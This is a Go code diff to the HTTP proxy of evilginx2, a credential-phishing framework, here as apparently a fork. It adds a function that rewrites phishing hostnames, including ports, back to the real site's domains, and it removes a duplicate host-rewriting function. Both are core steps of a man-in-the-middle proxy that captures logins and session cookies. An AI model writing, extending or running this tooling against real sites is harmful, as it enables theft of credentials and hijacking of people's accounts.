@@ -27,8 +27,8 @@ import (
 	"github.com/fatih/color"
 	"github.com/inconshreveable/go-vhost"
 
-	"github.com/kgretzky/evilginx2/database"
-	"github.com/kgretzky/evilginx2/log"
+	"github.com/hash3liZer/evilginx2/database"
+	"github.com/hash3liZer/evilginx2/log"
 )
 
 const (
@@ -931,6 +931,40 @@ func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
 	return nil
 }
 
+func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
+	if hostname == "" {
+		return hostname, false
+	}
+	prefix := ""
+	port := ""
+	if strings.Contains(hostname,":") {
+		s := strings.Split(hostname, ":")
+		hostname = s[0]
+		port = s[1]
+	}
+	if hostname[0] == '.' {
+		prefix = "."
+		hostname = hostname[1:]
+	}
+	for site, pl := range p.cfg.phishlets {
+		if p.cfg.IsSiteEnabled(site) {
+			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
+			if !ok {
+				continue
+			}
+			if port != "" {
+				phishDomain = phishDomain + ":" + port
+			}
+			for _, ph := range pl.proxyHosts {
+				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
+					return prefix + combineHost(ph.orig_subdomain, ph.domain), true
+				}
+			}
+		}
+	}
+	return hostname, false
+}
+
 func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 	if hostname == "" {
 		return hostname, false
@@ -967,35 +1001,6 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 	}
 	return hostname, false
 }
-
-func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
-	if hostname == "" {
-		return hostname, false
-	}
-	prefix := ""
-	if hostname[0] == '.' {
-		prefix = "."
-		hostname = hostname[1:]
-	}
-	for site, pl := range p.cfg.phishlets {
-		if p.cfg.IsSiteEnabled(site) {
-			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
-			if !ok {
-				continue
-			}
-			for _, ph := range pl.proxyHosts {
-				if hostname == ph.domain {
-					return prefix + phishDomain, true
-				}
-				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
-					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
-				}
-			}
-		}
-	}
-	return hostname, false
-}
-
 func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	for site, pl := range p.cfg.phishlets {
 		if p.cfg.IsSiteEnabled(site) {
